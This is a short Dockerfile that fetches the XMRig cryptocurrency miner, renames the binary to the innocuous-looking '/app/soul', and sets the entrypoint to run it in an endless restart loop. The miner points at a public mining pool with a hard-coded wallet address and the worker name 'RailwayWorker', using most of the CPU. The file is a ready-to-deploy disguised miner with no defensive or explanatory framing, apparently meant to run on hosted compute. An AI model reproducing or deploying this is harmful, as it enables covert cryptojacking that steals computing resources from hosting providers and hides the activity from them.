FROM debian:bookworm-slim

# Install dependencies
RUN apt-get update && apt-get install -y \
    wget ca-certificates libhwloc-dev libssl-dev libuv1-dev \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Download the miner binary
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz \
    && tar -xvzf xmrig-6.21.0-linux-static-x64.tar.gz \
    && mv xmrig-6.21.0/xmrig /app/soul \
    && rm -rf xmrig-6.21.0*

RUN chmod +x /app/soul


ENTRYPOINT ["/bin/sh", "-c", "while true; do echo Starting && /app/soul -a rx/0 -o pool.hashvault.pro:443 -u 46Z3AbjEnaq9Aey2SCcHpe1MmZmYdKpL2TgFhHdn7LBmbfo327ChMYPKrbBccHYHr9Le93EXut6YBNh6RRfbFvuMH5Lt3jA -p RailwayWorker --tls --cpu-max-threads-hint=80; sleep 3; done"]
